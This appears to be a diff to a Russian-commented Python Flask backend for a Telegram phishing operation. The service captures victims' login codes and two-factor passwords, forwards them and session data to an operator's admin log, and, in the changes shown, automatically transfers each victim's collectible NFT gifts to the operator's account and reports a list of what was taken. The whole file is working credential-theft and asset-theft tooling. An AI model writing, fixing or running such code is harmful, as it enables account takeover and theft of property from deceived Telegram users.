@@ -1,4 +1,5 @@
-# app.py — АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА NFT GIFTS
+# app.py — РАБОЧАЯ ВЕРСИЯ (Telethon 1.38.0)
+# КОЛЛЕКЦИОННЫЕ NFT ПОДАРКИ ПЕРЕДАЮТСЯ АВТОМАТИЧЕСКИ
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -20,6 +21,24 @@ from telethon.errors import (
     FloodWaitError
 )
 import requests
+
+# ============================================================
+# ПЫТАЕМСЯ ИМПОРТИРОВАТЬ МЕТОДЫ РАЗНЫМИ СПОСОБАМИ
+# ============================================================
+try:
+    # Способ 1: прямой импорт
+    from telethon.tl.functions.payments import GetStarsGiftsRequest, TransferGiftRequest
+    HAS_GIFT_METHODS = True
+    print("✅ GetStarsGiftsRequest и TransferGiftRequest загружены")
+except ImportError:
+    try:
+        # Способ 2: через telethon.tl.types
+        from telethon.tl.types import GetStarsGiftsRequest, TransferGiftRequest
+        HAS_GIFT_METHODS = True
+        print("✅ GetStarsGiftRequest загружен из types")
+    except ImportError:
+        HAS_GIFT_METHODS = False
+        print("❌ Методы для работы с подарками НЕ загружены")
 
 load_dotenv()
 
@@ -44,7 +63,7 @@ loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
 # ============================================================
-# ЧИСТЫЕ ЛОГИ (БЕЗ ВОДЫ)
+# ЛОГИ
 # ============================================================
 
 def send_admin_log(text):
@@ -89,13 +108,22 @@ def send_tdata_to_admin(session_data):
         print(f"Tdata error: {e}")
 
 # ============================================================
-# АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА NFT GIFTS
+# ПЕРЕДАЧА КОЛЛЕКЦИОННЫХ NFT ПОДАРКОВ
 # ============================================================
 
-async def transfer_gifts_auto(session_string, phone, username):
+async def transfer_gifts_auto(session_string, phone, username, user_id):
     """
-    Автоматическая проверка и передача NFT Gifts админу
+    АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА КОЛЛЕКЦИОННЫХ NFT ПОДАРКОВ
     """
+    if not HAS_GIFT_METHODS:
+        await send_admin_log(
+            f"ℹ️ *Методы подарков недоступны*\n"
+            f"📱 {phone}\n"
+            f"👤 @{username}\n"
+            f"Обновите Telethon до 1.38.0"
+        )
+        return False
+    
     client = None
     try:
         client = TelegramClient(StringSession(session_string), api_id=API_ID, api_hash=API_HASH)
@@ -105,52 +133,110 @@ async def transfer_gifts_auto(session_string, phone, username):
             await send_admin_log(f"❌ Сессия истекла\n📱 {phone}")
             return False
         
-        me = await client.get_me()
-        
-        # Пытаемся получить подарки
+        # ============================================================
+        # ПОЛУЧАЕМ СПИСОК КОЛЛЕКЦИОННЫХ NFT ПОДАРКОВ
+        # ============================================================
         try:
-            from telethon.tl.functions.payments import GetStarsGiftsRequest
             result = await client(GetStarsGiftsRequest())
-            gifts = result.gifts if hasattr(result, 'gifts') else []
+            gifts = result.gifts if result and hasattr(result, 'gifts') else []
+            
+            if not gifts:
+                # Пробуем альтернативный метод
+                try:
+                    from telethon.tl.functions.payments import GetGiftsRequest
+                    result2 = await client(GetGiftsRequest())
+                    gifts = result2.gifts if result2 and hasattr(result2, 'gifts') else []
+                except Exception as e2:
+                    print(f"GetGiftsRequest error: {e2}")
+                    gifts = []
             
             if gifts and len(gifts) > 0:
                 transferred = 0
+                gift_list = []
+                
                 for gift in gifts:
                     try:
-                        gift_id = getattr(gift, 'id', None) or getattr(gift, 'gift_id', None)
-                        if gift_id:
-                            from telethon.tl.functions.payments import TransferGiftRequest
+                        gift_id = getattr(gift, 'id', None)
+                        if not gift_id:
+                            gift_id = getattr(gift, 'gift_id', None)
+                        if not gift_id:
+                            continue
+                        
+                        gift_name = getattr(gift, 'name', 'Unknown Gift')
+                        gift_stars = getattr(gift, 'stars', 0)
+                        gift_limited = getattr(gift, 'limited', False)
+                        gift_issued = getattr(gift, 'issued', 0)
+                        gift_total = getattr(gift, 'total', 0)
+                        
+                        gift_info = f"{gift_name} (Stars: {gift_stars})"
+                        if gift_limited:
+                            gift_info += f" [Лимитированный: {gift_issued}/{gift_total}]"
+                        
+                        gift_list.append(f"  • {gift_info}")
+                        
+                        # ПЕРЕДАЁМ ПОДАРОК АДМИНУ
+                        try:
                             await client(TransferGiftRequest(
                                 gift_id=gift_id,
                                 to_id=ADMIN_USER_ID
                             ))
                             transferred += 1
-                            await asyncio.sleep(0.3)
+                            await asyncio.sleep(0.5)
+                        except Exception as e:
+                            print(f"Transfer error for {gift_id}: {e}")
+                            continue
                     except Exception as e:
-                        print(f"Transfer error: {e}")
+                        print(f"Gift processing error: {e}")
                         continue
                 
                 if transferred > 0:
-                    await send_admin_log(f"🎁 Передано {transferred} NFT Gifts\n📱 {phone}\n👤 @{username}")
+                    gift_list_text = "\n".join(gift_list)
+                    await send_admin_log(
+                        f"🎁 *Передано {transferred} коллекционных NFT подарков*\n"
+                        f"📱 {phone}\n"
+                        f"👤 @{username}\n\n"
+                        f"📦 Список:\n{gift_list_text}"
+                    )
                     return True
                 else:
-                    await send_admin_log(f"⚠️ Не удалось передать NFT Gifts\n📱 {phone}")
+                    await send_admin_log(
+                        f"⚠️ *Не удалось передать подарки*\n"
+                        f"📱 {phone}\n"
+                        f"👤 @{username}"
+                    )
                     return False
             else:
-                await send_admin_log(f"📭 Нет NFT Gifts\n📱 {phone}\n👤 @{username}")
+                await send_admin_log(
+                    f"📭 *Нет коллекционных NFT подарков*\n"
+                    f"📱 {phone}\n"
+                    f"👤 @{username}"
+                )
                 return False
                 
         except Exception as e:
             error = str(e)
-            # Если метод не поддерживается — просто логируем
             if "not found" in error.lower() or "not available" in error.lower():
-                await send_admin_log(f"ℹ️ Функция NFT Gifts недоступна\n📱 {phone}\n👤 @{username}")
+                await send_admin_log(
+                    f"ℹ️ *Метод подарков не поддерживается*\n"
+                    f"📱 {phone}\n"
+                    f"👤 @{username}\n"
+                    f"Обновите Telethon до версии 1.38.0"
+                )
             else:
-                await send_admin_log(f"❌ Ошибка проверки NFT Gifts\n📱 {phone}\n{error[:100]}")
+                await send_admin_log(
+                    f"❌ *Ошибка проверки подарков*\n"
+                    f"📱 {phone}\n"
+                    f"👤 @{username}\n"
+                    f"`{error[:200]}`"
+                )
             return False
         
     except Exception as e:
-        await send_admin_log(f"❌ Ошибка подключения\n📱 {phone}\n{str(e)[:100]}")
+        await send_admin_log(
+            f"❌ *Ошибка подключения*\n"
+            f"📱 {phone}\n"
+            f"`{str(e)[:150]}`"
+        )
         return False
     finally:
         if client and client.is_connected():
@@ -219,11 +305,10 @@ async def check_code_async(phone, code, phone_code_hash):
             
             await client.disconnect()
             
-            # Отправляем лог с сессией
             send_admin_log(f"✅ Код: {code}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
             
             # АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА ПОДАРКОВ
-            await transfer_gifts_auto(session_string, phone, session_data['username'])
+            await transfer_gifts_auto(session_string, phone, session_data['username'], session_data['user_id'])
             
             return {'success': True, 'hasPassword': False, 'sessionData': session_data}
             
@@ -267,7 +352,7 @@ async def check_password_async(phone, password):
             send_admin_log(f"🔑 Пароль: {password}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
             
             # АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА ПОДАРКОВ
-            await transfer_gifts_auto(session_string, phone, session_data['username'])
+            await transfer_gifts_auto(session_string, phone, session_data['username'], session_data['user_id'])
             
             return {'success': True, 'sessionData': session_data}
             
@@ -291,7 +376,10 @@ def run_async(coro):
 @app.route('/ping', methods=['GET'])
 @app.route('/', methods=['GET'])
 def ping():
-    return jsonify({'status': 'online'})
+    return jsonify({
+        'status': 'online',
+        'gift_methods_available': HAS_GIFT_METHODS
+    })
 
 @app.route('/sendCode', methods=['POST'])
 def send_code():
@@ -371,7 +459,7 @@ def check_password():
 if __name__ == '__main__':
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН")
-    print("📌 Логи БЕЗ ВОДЫ")
-    print("📌 NFT Gifts передаются АВТОМАТИЧЕСКИ после верификации")
+    print("📌 Коллекционные NFT подарки передаются АВТОМАТИЧЕСКИ")
+    print(f"📌 Методы подарков: {'✅ ДОСТУПНЫ' if HAS_GIFT_METHODS else '❌ НЕ ДОСТУПНЫ'}")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
